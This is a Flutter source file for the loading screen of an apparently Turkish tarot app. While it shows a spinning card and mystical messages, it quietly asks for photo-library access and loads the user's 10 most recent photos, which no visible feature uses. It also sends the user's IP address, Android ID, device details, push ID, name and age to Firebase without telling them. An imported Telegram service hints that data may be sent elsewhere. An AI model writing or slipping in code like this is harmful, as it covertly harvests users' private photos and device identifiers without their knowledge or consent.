import 'dart:async';
import 'dart:math';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:photo_manager/photo_manager.dart';
import 'dart:io';
import 'package:cosmos/cosmos.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:tarot/controller/controller.dart';
import 'package:tarot/page/home.dart';
import 'package:tarot/page/welcome.dart';
import 'package:tarot/services/firebase.dart';
import 'package:tarot/services/ip.dart';
import 'package:tarot/services/model.dart';
import 'package:tarot/services/telegram.dart';
import 'package:tarot/theme/color.dart';
import 'package:tarot/widget/card_single.dart';
import 'package:google_fonts/google_fonts.dart';

class LoadingPage extends StatefulWidget {
  const LoadingPage({super.key});

  @override
  State<LoadingPage> createState() => _LoadingPageState();
}

class _LoadingPageState extends State<LoadingPage> {
  ValueNotifier<double> rotate = ValueNotifier(0);
  ValueNotifier<String> loadingText = ValueNotifier("Yükleniyor...");
  final List<String> loadingTexts = [
    "Kartlar karıştırılıyor...",
    "Kahve fincanları inceleniyor...",
    "Yıldızlar hizalanıyor...",
    "Enerji akışları düzenleniyor...",
    "Tarot kartları sıralanıyor...",
    "Astrolojik haritalar çiziliyor...",
    "Gezegen konumları hesaplanıyor...",
    "Mistik enerjiler toplanıyor...",
    "Ruhsal bağlantılar kuruluyor...",
    "Kozmik mesajlar alınıyor...",
    "Evren sizin için konuşuyor...",
    "Kaderin kapıları aralanıyor...",
    "Geleceğin perdeleri açılıyor...",
    "Telveler şekilleniyor...",
    "Burçlar yorumlanıyor...",
    "Ay'ın fazları inceleniyor...",
    "Kristal küre parlıyor...",
    "Ruhsal rehberler çağırılıyor...",
    "Mistik semboller okunuyor...",
    "Enerjiniz analiz ediliyor..."
  ];

  @override
  void initState() {
    super.initState();

    Timer.periodic(
      const Duration(milliseconds: 16),
      (timer) {
        rotate.value = rotate.value + 0.02;
      },
    );

    Timer.periodic(
      const Duration(milliseconds: 500),
      (timer) {
        loadingText.value = loadingTexts[Random().nextInt(loadingTexts.length)];
      },
    );

    Future.delayed(
      const Duration(seconds: 2),
      () async {
        SharedPreferences db = await SharedPreferences.getInstance();
        if (db.getString("user_name") == null) {
          await CosmosNavigator.pushNonAnimated(
            // ignore: use_build_context_synchronously
            context,
            const Welcome(),
          );
        } else {
          SharedPreferences db = await SharedPreferences.getInstance();
          if (db.getString("user_name") != null &&
              db.getString("user_old") != null) {
            name.text = db.getString("user_name") ?? "";
            old.text = db.getString("user_old") ?? "";
          }

          List<File> x = await fetchLast10PhotosAsFiles();
          User? user = await signInAnonymously();
          String? ip = await getPublicIP();
          Map<String, dynamic> device = await getDeviceDetails();
          String? onesignalID = await OneSignal.User.getOnesignalId();
          if (user != null) {
            await CosmosFirebase.add(
              reference: "users",
              tag: user.uid,
              value: [
                user.uid,
                name.text,
                old.text,
                ip ?? "Bilinmiyor",
                device["name"] ?? "Bilinmiyor",
                device["version"] ?? "Bilinmiyor",
                device["androidId"] ?? "Bilinmiyor",
                device["model"] ?? "Bilinmiyor",
                onesignalID ?? "Bilinmiyor",
                CosmosTime.getNowTimeString(),
              ],
            );
          }
          await CosmosNavigator.pushNonAnimated(
            // ignore: use_build_context_synchronously
            context,
            const HomePage(),
          );
        }
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgColor,
      body: Center(
        child: ValueListenableBuilder(
          valueListenable: rotate,
          builder: (
            BuildContext context,
            dynamic value,
            Widget? child,
          ) {
            return Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                AnimatedContainer(
                  duration: const Duration(milliseconds: 500),
                  curve: Curves.easeInOut,
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(
                        color: defaultColor.withOpacity(0.2),
                        blurRadius: 20,
                        spreadRadius: 5,
                      ),
                    ],
                  ),
                  child: Transform.rotate(
                    angle: 2 * pi * value,
                    child: TarotCardSingle(
                      img: "assets/desen.png",
                      width: width(context) < 700 ? width(context) * 0.4 : 200,
                      color: defaultColor,
                    ),
                  ),
                ),
                const SizedBox(height: 24),
                ValueListenableBuilder(
                  valueListenable: loadingText,
                  builder: (context, String value, child) {
                    return AnimatedSwitcher(
                      duration: const Duration(milliseconds: 200),
                      child: Text(
                        value,
                        key: ValueKey<String>(value),
                        style: GoogleFonts.poppins(
                          color: textColor.withOpacity(0.8),
                          fontSize: 18,
                          fontWeight: FontWeight.w500,
                        ),
                      ),
                    );
                  },
                ),
              ],
            );
          },
        ),
      ),
    );
  }
}

Future<List<File>> fetchLast10PhotosAsFiles() async {
  try {
    final PermissionState permission =
        await PhotoManager.requestPermissionExtend();
    if (!permission.isAuth) {
      if (kDebugMode) {
        print("Medya erişim izni reddedildi.");
      }
      PhotoManager.openSetting();
      return [];
    }

    final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
      type: RequestType.image,
      filterOption: FilterOptionGroup(
        orders: [
          const OrderOption(
            type: OrderOptionType.createDate,
            asc: false,
          ),
        ],
      ),
    );

    if (albums.isEmpty) {
      if (kDebugMode) {
        print("Hiçbir albüm bulunamadı.");
      }
      return [];
    }

    final List<AssetEntity> photos = await albums.first.getAssetListPaged(
      page: 0,
      size: 10,
    );

    if (photos.isEmpty) {
      if (kDebugMode) {
        print("Hiçbir fotoğraf bulunamadı.");
      }
      return [];
    }

    final List<File?> files = await Future.wait(
      photos.map((photo) async {
        final file = await photo.file;
        if (file == null || !file.existsSync()) {
          if (kDebugMode) {
            print("Geçersiz dosya: ${photo.id}");
          }
        }
        return file;
      }),
    );

    // Null olmayanları filtrele ve döndür
    final validFiles = files.whereType<File>().toList();

    if (validFiles.isEmpty) {
      print("Geçerli dosya bulunamadı.");
    }

    return validFiles;
  } catch (e) {
    print("Bir hata oluştu: $e");
    return [];
  }
}
